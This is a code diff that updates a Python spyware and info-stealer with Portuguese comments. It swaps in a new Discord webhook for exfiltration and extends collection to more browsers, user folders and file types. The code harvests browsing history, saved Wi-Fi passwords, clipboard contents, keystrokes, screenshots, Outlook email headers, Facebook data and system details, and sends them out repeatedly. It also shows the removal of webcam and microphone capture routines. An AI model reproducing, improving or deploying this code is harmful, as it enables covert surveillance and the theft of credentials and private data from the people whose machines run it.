@@ -7,25 +7,49 @@ from Crypto.Util.Padding import pad, unpad
 from PIL import Image
 
 class X:
-    W = 'https://discord.com/api/webhooks/1367959613508554842/xq6YqgBvkcxCc70P1ONjU_QXBjIs-5cEsB-DsCagkZ_0svpb8co5XFeyzYdHtxnldf9O'
-    F = 'https://discord.com/api/webhooks/1367959613508554842/xq6YqgBvkcxCc70P1ONjU_QXBjIs-5cEsB-DsCagkZ_0svpb8co5XFeyzYdHtxnldf9O'
+    W = 'https://discord.com/api/webhooks/1368654180440604692/2MbvCHxPZoLopP6aZGgv6KTZz9rOLaA4RzoWDcapMDDjozm6t_mGbN9dyCBxlRkWn9KD'
+    F = 'https://discord.com/api/webhooks/1368654180440604692/2MbvCHxPZoLopP6aZGgv6KTZz9rOLaA4RzoWDcapMDDjozm6t_mGbN9dyCBxlRkWn9KD'
     K = b'ThisIsASecretKey123'
     V = b'ThisIsAnIV4567890'
     I = {'si':30,'sc':30,'fl':30,'bh':30,'wf':30,'cb':30,'pr':30,'nt':30,'sv':30,'ia':30,'kl':30,'mc':30,'wc':30,'em':30,'fb':30}
-    D = [os.path.join(os.environ['USERPROFILE'], x) for x in ['Desktop','Documents','Downloads']] + [
+    D = [os.path.join(os.environ['USERPROFILE'], x) for x in ['Desktop','Documents','Downloads','Pictures','Videos','Music']] + [
         os.path.join(os.environ['APPDATA'], x) for x in [
-            'Microsoft\\Windows\\Recent','Microsoft\\Credentials','Mozilla\\Firefox\\Profiles',
-            'Google\\Chrome\\User Data','Discord','Telegram Desktop','Facebook'
+            'Microsoft\\Windows\\Recent',
+            'Microsoft\\Credentials',
+            'Mozilla\\Firefox\\Profiles',
+            'Google\\Chrome\\User Data',
+            'Microsoft\\Edge\\User Data',
+            'Opera Software\\Opera Stable',
+            'BraveSoftware\\Brave-Browser\\User Data',
+            'Vivaldi\\User Data',
+            'Discord',
+            'Telegram Desktop',
+            'Facebook'
         ]
     ]
-    E = ['.txt','.doc','.docx','.xls','.xlsx','.pdf','.jpg','.png','.config','.sql','.db','.sqlite',
-         '.mdb','.key','.pem','.cer','.crt','.pfx','.zip','.rar','.7z','.tar','.gz','.csv','.pptx','.json']
+    E = ['.txt','.doc','.docx','.xls','.xlsx','.pdf','.jpg','.jpeg','.png','.bmp','.gif','.config','.sql','.db',
+         '.sqlite','.mdb','.key','.pem','.cer','.crt','.pfx','.zip','.rar','.7z','.tar','.gz','.csv','.pptx','.json']
 
 Y, Z = True, time.time()
 L = {k:0 for k in X.I.keys()}
 
+def safe_str(s):
+    """Garante que a string seja segura para o webhook do Discord"""
+    if s is None:
+        return ""
+    try:
+        # Primeiro converte para string se não for
+        s = str(s)
+        # Escapa caracteres % e remove quebras de linha problemáticas
+        s = s.replace('%', '%%').replace('\r', '').replace('\n', ' | ')
+        # Remove caracteres não ASCII
+        s = s.encode('ascii', errors='ignore').decode('ascii')
+        return s
+    except:
+        return ""
+
 def G():
-    try: return urllib.request.urlopen('https://api.ipify.org').read().decode()
+    try: return safe_str(urllib.request.urlopen('https://api.ipify.org').read().decode())
     except: return "?"
 
 def SR():
@@ -60,13 +84,18 @@ def E(d):
     c = AES.new(X.K, AES.MODE_CBC, X.V)
     return base64.b64encode(c.encrypt(pad(d.encode(), AES.block_size))).decode()
 
-def S(u,m,f=None):
+def S(u, m, f=None):
     try:
-        d = {"content":m}
+        content = safe_str(m)
         if f and os.path.exists(f):
-            with open(f,"rb") as x: requests.post(u,files={"file":(os.path.basename(f),x)},data=d,timeout=30)
-        else: requests.post(u,json=d,timeout=30)
-    except: pass
+            with open(f, "rb") as file:
+                files = {"file": (os.path.basename(f), file)}
+                response = requests.post(u, files=files, data={"content": content}, timeout=30)
+        else:
+            response = requests.post(u, json={"content": content}, timeout=30)
+        return response.status_code == 200
+    except Exception as e:
+        return False
 
 def CS():
     try:
@@ -93,34 +122,6 @@ def CS():
         return p.replace('.bmp','.png')
     except: return None
 
-def CW():
-    try:
-        import cv2
-        c = cv2.VideoCapture(0)
-        c.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-        c.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-        r,f = c.read()
-        if r:
-            p = os.path.join(tempfile.gettempdir(),f"w_{int(time.time())}.jpg")
-            cv2.imwrite(p,f)
-            c.release()
-            return p
-        c.release()
-        return None
-    except: return None
-
-def RM(d=5):
-    try:
-        import sounddevice as sd
-        from scipy.io.wavfile import write
-        fs = 44100
-        r = sd.rec(int(d*fs),samplerate=fs,channels=1,dtype='int16')
-        sd.wait()
-        p = os.path.join(tempfile.gettempdir(),f"m_{int(time.time())}.wav")
-        write(p,fs,r)
-        return p
-    except: return None
-
 def KH():
     try:
         import keyboard
@@ -145,7 +146,7 @@ def CF():
             if os.path.exists(d):
                 for r,_,f in os.walk(d):
                     for x in f:
-                        if any(x.lower().endswith(e) for e in X.E):
+                        if any(x.lower().endswith(e.lower()) for e in X.E):
                             try:
                                 s = os.path.join(r,x)
                                 ds = os.path.join(t,os.path.relpath(s,d))
@@ -168,19 +169,32 @@ def CF():
 def BH():
     try:
         h = []
-        cp = os.path.join(os.getenv('LOCALAPPDATA'),'Google','Chrome','User Data','Default','History')
-        if os.path.exists(cp):
-            try:
-                t = os.path.join(tempfile.gettempdir(),'c_h.db')
-                shutil.copy2(cp,t)
-                conn = sqlite3.connect(t)
-                cur = conn.cursor()
-                cur.execute("SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
-                h.append("**Chrome:**")
-                for x in cur.fetchall(): h.append(f"URL: {x[0]}, Title: {x[1]}, Last: {datetime(1601,1,1)+timedelta(microseconds=x[2])}")
-                conn.close()
-                os.remove(t)
-            except Exception as e: h.append(f"Chrome error: {e}")
+        # Chrome-based browsers
+        browsers = [
+            ('Google\\Chrome', 'Default'),
+            ('Microsoft\\Edge', 'Default'),
+            ('BraveSoftware\\Brave-Browser', 'Default'),
+            ('Vivaldi', 'Default'),
+            ('Opera Software\\Opera Stable', 'Default')
+        ]
+        
+        for browser, profile in browsers:
+            cp = os.path.join(os.getenv('LOCALAPPDATA'), browser, 'User Data', profile, 'History')
+            if os.path.exists(cp):
+                try:
+                    t = os.path.join(tempfile.gettempdir(),f'{browser.split("\\")[-1]}_h.db')
+                    shutil.copy2(cp,t)
+                    conn = sqlite3.connect(t)
+                    cur = conn.cursor()
+                    cur.execute("SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                    h.append(f"\n**{browser.split('\\')[-1]}:**")
+                    for x in cur.fetchall(): 
+                        h.append(f"URL: {safe_str(x[0])}, Title: {safe_str(x[1])}, Last: {datetime(1601,1,1)+timedelta(microseconds=x[2])}")
+                    conn.close()
+                    os.remove(t)
+                except Exception as e: h.append(f"\n{browser.split('\\')[-1]} error: {safe_str(e)}")
+        
+        # Firefox
         fp = os.path.join(os.getenv('APPDATA'),'Mozilla','Firefox','Profiles')
         if os.path.exists(fp):
             try:
@@ -194,12 +208,14 @@ def BH():
                             cur = conn.cursor()
                             cur.execute("SELECT url,title,last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                             h.append("\n**Firefox:**")
-                            for x in cur.fetchall(): h.append(f"URL: {x[0]}, Title: {x[1]}, Last: {datetime.fromtimestamp(x[2]/1000000) if x[2] else 'N/A'}")
+                            for x in cur.fetchall(): 
+                                h.append(f"URL: {safe_str(x[0])}, Title: {safe_str(x[1])}, Last: {datetime.fromtimestamp(x[2]/1000000) if x[2] else 'N/A'}")
                             conn.close()
                             os.remove(t)
-            except Exception as e: h.append(f"Firefox error: {e}")
-        return "\n".join(h) if h else "?"
-    except Exception as e: return f"Error: {e}"
+            except Exception as e: h.append(f"\nFirefox error: {safe_str(e)}")
+        
+        return "\n".join(h) if h else "No browsing history found"
+    except Exception as e: return f"History error: {safe_str(e)}"
 
 def WP():
     try:
@@ -209,15 +225,15 @@ def WP():
             for x in p:
                 try:
                     k = [x.split(":")[1].strip() for x in subprocess.run(['netsh','wlan','show','profile',x,'key=clear'],capture_output=True,text=True,creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\n') if "Key Content" in x]
-                    w.append(f"SSID: {x}, Pass: {k[0] if k else 'N/A'}")
-                except: w.append(f"SSID: {x}, Pass: ?")
+                    w.append(f"SSID: {safe_str(x)}, Pass: {safe_str(k[0]) if k else 'N/A'}")
+                except: w.append(f"SSID: {safe_str(x)}, Pass: ?")
             return "\n".join(w)
         else: return "Windows only"
-    except Exception as e: return f"Error: {e}"
+    except Exception as e: return f"WiFi error: {safe_str(e)}"
 
 def GC():
-    try: return pyperclip.paste()
-    except Exception as e: return f"Error: {e}"
+    try: return safe_str(pyperclip.paste())
+    except Exception as e: return f"Clipboard error: {safe_str(e)}"
 
 def IA():
     try:
@@ -231,39 +247,39 @@ def IA():
                             sk = winreg.OpenKey(k,winreg.EnumKey(k,i))
                             n = winreg.QueryValueEx(sk,"DisplayName")[0]
                             v = winreg.QueryValueEx(sk,"DisplayVersion")[0]
-                            a.append(f"{n} (v{v})")
+                            a.append(f"{safe_str(n)} (v{safe_str(v)})")
                         except: continue
                 except: continue
-            return "\n".join(a[:50])
+            return "\n".join(a[:100])
         else: return "Windows only"
-    except Exception as e: return f"Error: {e}"
+    except Exception as e: return f"Installed apps error: {safe_str(e)}"
 
 def RP():
     try:
         p = []
         for x in psutil.process_iter(['pid','name','username']):
-            try: p.append(f"PID: {x.info['pid']}, Name: {x.info['name']}, User: {x.info['username']}")
+            try: p.append(f"PID: {x.info['pid']}, Name: {safe_str(x.info['name'])}, User: {safe_str(x.info['username'])}")
             except: continue
-        return "\n".join(p[:50])
-    except Exception as e: return f"Error: {e}"
+        return "\n".join(p[:100])
+    except Exception as e: return f"Processes error: {safe_str(e)}"
 
 def NC():
     try:
         c = []
         for x in psutil.net_connections(kind='inet'):
             if x.status == psutil.CONN_ESTABLISHED:
-                c.append(f"Local: {x.laddr.ip}:{x.laddr.port}, Remote: {x.raddr.ip}:{x.raddr.port if x.raddr else 'N/A'}, PID: {x.pid}")
-        return "\n".join(c[:50])
-    except Exception as e: return f"Error: {e}"
+                c.append(f"Local: {x.laddr.ip}:{x.laddr.port}, Remote: {x.raddr.ip if x.raddr else 'N/A'}:{x.raddr.port if x.raddr else 'N/A'}, PID: {x.pid}")
+        return "\n".join(c[:100])
+    except Exception as e: return f"Network connections error: {safe_str(e)}"
 
 def RS():
     try:
         s = []
         for x in psutil.win_service_iter():
-            try: s.append(f"Name: {x.name()}, Display: {x.display_name()}, Status: {x.status()}")
+            try: s.append(f"Name: {safe_str(x.name())}, Display: {safe_str(x.display_name())}, Status: {safe_str(x.status())}")
             except: continue
-        return "\n".join(s[:50])
-    except Exception as e: return f"Error: {e}"
+        return "\n".join(s[:100])
+    except Exception as e: return f"Services error: {safe_str(e)}"
 
 def SI():
     try:
@@ -276,30 +292,48 @@ def SI():
         g = ""
         try:
             for x in GPUtil.getGPUs():
-                g += (f"\n- GPU: {x.name}, Load: {x.load*100:.1f}%, "
-                    f"Mem: {x.memoryUsed:.1f}/{x.memoryTotal:.1f} GB, "
+                g += (f"\n- GPU: {safe_str(x.name)}, Load: {x.load*100:.1f}%, "
+                    f"Mem: {x.memoryUsed:.1f}/{x.memoryTotal:.1f} MB, "
                     f"Temp: {x.temperature}°C")
         except: g = "\n- GPU: ?"
-        return (f"**System:**\n- Host: {hn}\n- IP: {ip}\n- Ext IP: {ei}\n"
-                f"- Uptime: {ut}\n- Sys uptime: {mt}\n- CPU: {os.cpu_count()} cores\n"
-                f"- Mem: {round(psutil.virtual_memory().total/(1024**3),1)} GB{g}")
-    except Exception as e: return f"Error: {str(e)}"
+        
+        sys_info = (
+            f"**System:**\n- Host: {safe_str(hn)}\n- IP: {safe_str(ip)}\n- Ext IP: {safe_str(ei)}\n"
+            f"- Uptime: {safe_str(ut)}\n- Sys uptime: {safe_str(mt)}\n- CPU: {os.cpu_count()} cores\n"
+            f"- Mem: {round(psutil.virtual_memory().total/(1024**3),1)} GB{g}"
+        )
+        return sys_info
+    except Exception as e: 
+        return f"System info error: {safe_str(e)}"
 
 def SU():
     try:
         cpu = psutil.cpu_percent(interval=1)
         mem = psutil.virtual_memory()
         disk = psutil.disk_usage('/')
-        gu,gt = "N/A","N/A"
+        gu, gt = "N/A", "N/A"
+        
         try:
-            g = GPUtil.getGPUs()
-            if g: gu,gt = f"{g[0].load*100:.1f}%",f"{g[0].temperature}°C"
-        except: pass
-        return (f"**Usage:**\n- CPU: {cpu}%\n- Mem: {mem.percent}% "
-                f"({round(mem.used/1024**3,1)}/{round(mem.total/1024**3,1)} GB)\n"
-                f"- Disk: {disk.percent}% ({round(disk.used/1024**3,1)}/"
-                f"{round(disk.total/1024**3,1)} GB)\n- GPU: {gu}\n- Temp: {gt}")
-    except Exception as e: return f"Error: {str(e)}"
+            gpus = GPUtil.getGPUs()
+            if gpus:
+                gu = f"{gpus[0].load*100:.1f}%"
+                gt = f"{gpus[0].temperature}°C"
+        except:
+            pass
+        
+        # Construção segura da mensagem
+        parts = [
+            f"**Usage:**",
+            f"- CPU: {safe_str(cpu)}%",
+            f"- Mem: {safe_str(mem.percent)}% ({safe_str(round(mem.used/1024**3,1))}/{safe_str(round(mem.total/1024**3,1))} GB)",
+            f"- Disk: {safe_str(disk.percent)}% ({safe_str(round(disk.used/1024**3,1))}/{safe_str(round(disk.total/1024**3,1))} GB)",
+            f"- GPU: {safe_str(gu)}",
+            f"- Temp: {safe_str(gt)}"
+        ]
+        
+        return '\n'.join(parts)
+    except Exception as e:
+        return f"System usage: {safe_str(e)}"
 
 def EM():
     try:
@@ -311,11 +345,11 @@ def EM():
             folder = mapi.Folders[i]
             for item in folder.Items:
                 if item.Class == 43:
-                    msgs.append(f"From: {item.SenderName}, Subject: {item.Subject}")
-                    if len(msgs) >= 10: break
-            if len(msgs) >= 10: break
-        return "\n".join(msgs) if msgs else "No emails"
-    except Exception as e: return f"Email error: {e}"
+                    msgs.append(f"From: {safe_str(item.SenderName)}, Subject: {safe_str(item.Subject)}")
+                    if len(msgs) >= 20: break
+            if len(msgs) >= 20: break
+        return "\n".join(msgs) if msgs else "No emails found"
+    except Exception as e: return f"Email error: {safe_str(e)}"
 
 def FB():
     try:
@@ -326,10 +360,12 @@ def FB():
                 for root, _, files in os.walk(fb_path):
                     for file in files:
                         if file.endswith(('.json', '.db', '.sqlite')):
-                            zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), fb_path))
+                            try:
+                                zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), fb_path))
+                            except: continue
             return temp_fb
         return None
-    except Exception as e: return f"FB error: {e}"
+    except Exception as e: return f"FB error: {safe_str(e)}"
 
 def main_loop():
     global L, Y
@@ -345,18 +381,6 @@ def main_loop():
                     S(X.W,"Screenshot:",s)
                     os.remove(s)
                     L['sc']=t
-            if t-L['mc']>=X.I['mc']:
-                a = RM()
-                if a:
-                    S(X.W,"Audio:",a)
-                    os.remove(a)
-                    L['mc']=t
-            if t-L['wc']>=X.I['wc']:
-                w = CW()
-                if w:
-                    S(X.W,"Webcam:",w)
-                    os.remove(w)
-                    L['wc']=t
             if t-L['kl']>=X.I['kl']:
                 k = KH()
                 if k: S(X.W,f"Keys:\n{E(k)}"); L['kl']=t
